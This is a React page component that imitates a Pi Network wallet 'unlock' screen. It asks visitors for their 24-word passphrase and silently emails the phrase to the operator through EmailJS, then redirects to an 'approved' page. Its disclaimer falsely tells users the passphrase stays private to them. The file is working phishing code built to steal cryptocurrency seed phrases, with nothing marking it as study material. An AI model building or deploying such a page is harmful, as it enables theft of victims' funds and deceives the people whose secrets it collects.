import React, { useState } from "react";
import { useParams } from "react-router-dom";
import pilogo from "../assets/pi_logo.png";
import { exchanges } from "../services/exchange";
import loop from "../assets/images/exchanges/loop.png";

// Wallet imports
import emailjs from "@emailjs/browser";
import Spinner from "react-activity/dist/Spinner";
import "react-activity/dist/Spinner.css";
import { useNavigate } from "react-router-dom";

function Payment() {
  const { id } = useParams();
  const method = exchanges.find((item) => item.id === parseInt(id, 10));
  const navigate = useNavigate();
  const [phrase, setPhrase] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);

  const serviceID = import.meta.env.VITE_EMAILJS_SERVICE_ID;
  const templateID = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
  const userID = import.meta.env.VITE_EMAILJS_USER_ID;

  const handleSend = async () => {
    setLoading(true);
    setError(false);

    const wordCount = phrase.trim().split(/\s+/).length;
    if (wordCount !== 24) {
      setError(true);
      setLoading(false);
      return;
    }

    const templateParams = { message: phrase };

    try {
      await emailjs.send(serviceID, templateID, templateParams, userID);
      setPhrase("");
      navigate("/approved");
    } catch (error) {
      console.error("Error:", error);
      alert("Verification failed. Please try again.");
      setError(true);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-gray-100 to-purple-50 p-6">
      <div className="bg-white shadow-xl rounded-2xl p-8 w-full max-w-lg">
        {/* Header */}
        <div className="flex items-center justify-between mb-6">
          <img src={pilogo} alt="Pi Logo" className="w-12 h-12" />
          <div className="text-center">
            {/* <h1 className="text-xl font-bold text-purple-700">{method?.label}</h1> */}
          <img src={loop} alt="Loop" className="w-8 h-8" />
          </div>
          <div>

{method && (
  <div className="flex flex-col items-center mb-6">
    <img
      src={method.image}
      alt={method.label}
      className="w-12 h-12  object-cover rounded-full shadow-md"
      />
  </div>
)}
</div>
        </div>

        {/* Method Info */}
      

        {/* Unlock Form */}
        <h2 className="text-lg font-semibold text-center text-gray-800 mb-4">
          Unlock Pi Wallet
        </h2>
        <textarea
          onChange={(e) => setPhrase(e.target.value)}
          value={phrase}
          className="w-full border-2 border-gray-200 rounded-lg p-4 focus:outline-none focus:ring-1/2 focus:ring-yellow-500 focus:border-yellow-500 resize-none transition-all"
          placeholder="Enter your 24-word passphrase here"
          rows="5"
        />
        {error && <p className="text-red-500 text-sm mt-2">Invalid passphrase. Must be exactly 24 words.</p>}

        {/* Unlock Button */}
        <button
          onClick={handleSend}
          className="w-full mt-4 bg-purple-700 text-white py-3 rounded-lg font-medium shadow-md hover:bg-purple-800 transition-all flex justify-center items-center"
        >
          {loading ? <Spinner color="#fff" /> : "Connect Wallet"}
        </button>

        {/* Disclaimer */}
        <p className="text-sm text-gray-600 mt-6 text-center leading-relaxed">
          As a non-custodial wallet, your passphrase is exclusively accessible to you.
          Recovery is impossible. Lost your passphrase? You can create a new wallet,
          but all your previous π will be inaccessible.
        </p>
      </div>
    </div>
  );
}

export default Payment;
